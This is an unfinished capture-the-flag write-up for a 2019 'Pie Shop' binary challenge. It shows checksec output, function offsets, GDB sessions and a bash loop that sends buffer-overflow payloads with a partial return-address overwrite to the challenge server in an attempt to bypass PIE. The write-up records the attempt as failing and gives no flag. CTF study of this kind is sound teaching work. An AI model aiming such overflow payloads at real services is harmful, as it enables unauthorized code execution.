# Pie Shop
Binary

## Challenge 

I sure love pies (source)!

/problems/2019/pie_shop/

nc shell.actf.co 19306

Author: kmh11

## Hint

1. What does it mean if PIE is enabled on a binary?
2. 20 bits is not that much.

## Solution

PIE enabled

	# pwn checksec ./pie_shop
	[*] '/FILES/pie_shop'
	    Arch:     amd64-64-little
	    RELRO:    Partial RELRO
	    Stack:    No canary found
	    NX:       NX enabled
	    PIE:      PIE enabled

Solution is to bruteforce PIE?

	flag: 0x011a9
	get_pie: 0x011bc
	main: 0x01262

A partial overwrite does not work (partial overwrite 0x91a9)

	# for i in {50..100}; do echo $i; python -c "import sys; sys.stdout.write('A'*$i + '\xa9\x11')" | nc shell.actf.co 19306; done

https://www.ret2rop.com/2018/08/can-we-bruteforce-aslr.html

GDB addresses

	(gdb) set disable-randomization off
	(gdb) run
	(gdb) info add flag
	Symbol "flag" is at 0x55da5b51c1a9 in a file compiled without debugging.
	(gdb) run
	(gdb) info add flag
	Symbol "flag" is at 0x5564b43ac1a9 in a file compiled without debugging.
	(gdb) run
	(gdb) info add flag
	Symbol "flag" is at 0x56526e2991a9 in a file compiled without debugging.
	(gdb) info frame
	Stack level 0, frame at 0x7fff7d850fb0:
	 rip = 0x7f9a0a4d5761 in read; saved rip = 0x7f9a0a4678e0
	 called by frame at 0x7fff7d850ff0
	 Arglist at 0x7fff7d850fa0, args: 
	 Locals at 0x7fff7d850fa0, Previous frame's sp is 0x7fff7d850fb0
	 Saved registers:
	  rip at 0x7fff7d850fa8
	(gdb) info stack 
	#0  0x00007f9a0a4d5761 in read () from /lib/x86_64-linux-gnu/libc.so.6
	#1  0x00007f9a0a4678e0 in _IO_file_underflow () from /lib/x86_64-linux-gnu/libc.so.6
	#2  0x00007f9a0a468a02 in _IO_default_uflow () from /lib/x86_64-linux-gnu/libc.so.6
	#3  0x00007f9a0a45c3fd in gets () from /lib/x86_64-linux-gnu/libc.so.6
	#4  0x000056526e2991e6 in get_pie ()
	#5  0x000056526e2992e0 in main ()
	(gdb) info add main
	Symbol "main" is at 0x56526e299262 in a file compiled without debugging.


## Flag

	??